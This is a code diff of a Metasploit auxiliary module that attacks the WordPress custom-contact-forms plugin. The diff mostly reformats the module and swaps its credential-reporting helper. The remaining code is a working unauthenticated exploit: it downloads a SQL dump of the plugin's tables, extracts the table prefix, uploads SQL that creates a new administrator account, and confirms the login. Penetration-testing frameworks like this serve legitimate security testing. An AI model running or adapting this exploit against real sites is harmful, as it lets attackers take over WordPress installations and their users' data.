@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -8,28 +8,34 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HTTP::Wordpress
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'WordPress custom-contact-forms Plugin SQL Upload',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'WordPress custom-contact-forms Plugin SQL Upload',
+        'Description' => %q{
           The WordPress custom-contact-forms plugin <= 5.1.0.3 allows unauthenticated users to download
           a SQL dump of the plugins database tables. It's also possible to upload files containing
           SQL statements which will be executed. The module first tries to extract the WordPress
           table prefix from the dump and then attempts to create a new admin user.
-      },
-      'Author' =>
-        [
+        },
+        'Author' => [
           'Marc-Alexandre Montpas', # Vulnerability discovery
           'Christian Mehlmauer' # Metasploit module
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'URL', 'http://blog.sucuri.net/2014/08/database-takeover-in-custom-contact-forms.html' ],
           [ 'URL', 'https://plugins.trac.wordpress.org/changeset?old_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.3&old=997569&new_path=%2Fcustom-contact-forms%2Ftags%2F5.1.0.4&new=997569&sfp_email=&sfph_mail=' ],
           [ 'WPVDB', '7542' ]
         ],
-      'DisclosureDate' => 'Aug 07 2014'
-      ))
+        'DisclosureDate' => '2014-08-07',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
   end
 
   def get_sql(table_prefix, username, password)
@@ -43,10 +49,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def get_table_prefix
     res = send_request_cgi({
-      'uri'       => wordpress_url_admin_post,
-      'method'    => 'POST',
+      'uri' => wordpress_url_admin_post,
+      'method' => 'POST',
       'vars_post' => {
-        'ccf_export' => "1"
+        'ccf_export' => '1'
       }
     })
     return nil if res.nil? || res.code != 302 || res.headers['Location'] !~ /\.sql$/
@@ -62,41 +68,14 @@ class MetasploitModule < Msf::Auxiliary
     table_prefix
   end
 
-  def report_cred(opts)
-    service_data = {
-      address: opts[:ip],
-      port: opts[:port],
-      service_name: opts[:service_name],
-      protocol: 'tcp',
-      workspace_id: myworkspace_id
-    }
-
-    credential_data = {
-      origin_type: :service,
-      module_fullname: fullname,
-      username: opts[:user],
-      private_data: opts[:password],
-      private_type: :password
-    }.merge(service_data)
-
-    login_data = {
-      last_attempted_at: DateTime.now,
-      core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::SUCCESSFUL,
-      proof: opts[:proof]
-    }.merge(service_data)
-
-    create_credential_login(login_data)
-  end
-
   def run
     username = Rex::Text.rand_text_alpha(10)
     password = Rex::Text.rand_text_alpha(20)
 
-    print_status("Trying to get table_prefix")
+    print_status('Trying to get table_prefix')
     table_prefix = get_table_prefix
     if table_prefix.nil?
-      print_error("Unable to get table_prefix")
+      print_error('Unable to get table_prefix')
       return
     else
       print_status("got table_prefix '#{table_prefix}'")
@@ -109,10 +88,10 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status("Inserting user #{username} with password #{password}")
     res = send_request_cgi(
-      'method'   => 'POST',
-      'uri'      => wordpress_url_admin_post,
-      'ctype'    => "multipart/form-data; boundary=#{data.bound}",
-      'data'     => post_data
+      'method' => 'POST',
+      'uri' => wordpress_url_admin_post,
+      'ctype' => "multipart/form-data; boundary=#{data.bound}",
+      'data' => post_data
     )
 
     if res.nil? || res.code != 302 || res.headers['Location'] != 'options-general.php?page=custom-contact-forms'
@@ -122,21 +101,13 @@ class MetasploitModule < Msf::Auxiliary
     # test login
     cookie = wordpress_login(username, password)
 
-    # login successfull
+    # login successful
     if cookie
-      print_status("User #{username} with password #{password} successfully created")
-      report_cred(
-        ip: rhost,
-        port: rport,
-        user: username,
-        password: password,
-        service_name: 'WordPress',
-        proof: cookie
-      )
+      print_good("User #{username} with password #{password} successfully created")
+      store_valid_credential(user: username, private: password, proof: cookie)
     else
-      print_error("User creation failed")
+      print_error('User creation failed')
       return
     end
   end
-
 end
